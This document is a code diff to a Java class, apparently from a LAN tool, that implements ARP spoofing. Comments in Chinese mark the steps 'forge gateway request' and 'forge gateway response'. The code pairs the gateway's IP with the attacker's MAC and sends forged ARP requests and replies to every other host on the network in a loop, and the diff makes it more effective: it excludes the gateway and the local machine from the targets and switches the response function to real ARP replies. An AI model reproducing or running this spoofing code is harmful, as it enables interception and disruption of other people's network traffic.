@@ -10,13 +10,9 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import java.net.UnknownHostException;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 
 import static org.jasic.utils.StringUtils.fieldval2Map;
-import static org.jasic.utils.StringUtils.mapToString;
 /**
  * User: Jasic
  * Date: 13-9-16
@@ -39,33 +35,47 @@ public class ArpStrategy extends Thread {
 
     public ArpStrategy(IpMacPair ipMacPair) {
         this.localIpMacPair = ipMacPair;
+        this.interval = Globalvariables.ARP_STRATEGY_INTERVAL;
     }
 
     @Override
     public void run() {
+
+        Timer timer = new Timer(true);
+        timer.schedule(new TimerTask() {
+            @Override
+            public void run() {
+                // 1、arp广播请求
+                try {
+                    List bs = brocasStrategy();
+                    logger.info(logHeader + bs.toString());
+                    if (bs.size() == 0) {
+                        logger.info(logHeader + "network configure error, generate none arp brocast packet~");
+                        return;
+                    }
+                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(bs);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    logger.info(logHeader + e.getMessage());
+                }
+
+            }
+        }, 0, this.interval * 2);
         while (!isInterrupted()) {
             try {
-                // 1、arp广播请求
-                List bs = brocasStrategy();
                 // 2、伪造网关请请
                 List fqs = fakeReqStrategy();
                 // 3、伪造网关响应
                 List fps = fakeRepStrategy();
 
-                if (bs.size() != 0) {
-                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(bs);
-                    logger.info(bs.toString());
-                    TimeUtil.sleep(2);
-                }
-
                 if (fqs.size() != 0) {
                     GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(fqs);
-                    logger.info(mapToString(fieldval2Map(fqs)));
+                    logger.info(logHeader + "[伪造网关请求]" + fqs.toString());
                     TimeUtil.sleep(2);
                 }
                 if (fps.size() != 0) {
                     GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(fps);
-                    logger.info(mapToString(fieldval2Map(fps)));
+                    logger.info(logHeader + "[伪造网关响应]" + fps.toString());
                 }
                 TimeUtil.sleep(this.interval);
             } catch (Exception e) {
@@ -93,14 +103,16 @@ public class ArpStrategy extends Thread {
         Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);
 
         if (gateWay == null || availIpMacs.size() == 0) {
-            logger.info(logHeader + "GateWay is not available [" + fieldval2Map(gateWay) + "]");
+            logger.info(logHeader + "GateWay[" + fieldval2Map(gateWay) + "]" + ",from cache has none connectivity machine ");
             return arpPacketList;
         }
+        availIpMacs.remove(gateWay.getIp()); // 移除网关和本机
 
         // 伪造网关ip-mac对
         IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), this.localIpMacPair.getMac());
 
         for (IpMacPair ipMacPair : availIpMacs.values()) {
+            if (ipMacPair.getMac().equals(this.localIpMacPair.getMac())) continue;// 排除本机
             ARPPacket packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
             arpPacketList.add(packet);
         }
@@ -117,15 +129,17 @@ public class ArpStrategy extends Thread {
         Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);
 
         if (gateWay == null || availIpMacs.size() == 0) {
-            logger.info(logHeader + "GateWay is not available [" + fieldval2Map(gateWay) + "]");
+            logger.info(logHeader + "GateWay[" + fieldval2Map(gateWay) + "]" + ",from cache has none connectivity machine ");
             return arpPacketList;
         }
+        availIpMacs.remove(gateWay.getIp()); // 移除网关和本机
 
         // 伪造网关ip-mac对
         IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), this.localIpMacPair.getMac());
 
         for (IpMacPair ipMacPair : availIpMacs.values()) {
-            ARPPacket packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
+            if (ipMacPair.getMac().equals(this.localIpMacPair.getMac())) continue;// 排除本机
+            ARPPacket packet = PacketGener.getArpRepPacket(fakeIpMac, ipMacPair, true);
             arpPacketList.add(packet);
         }
         return arpPacketList;
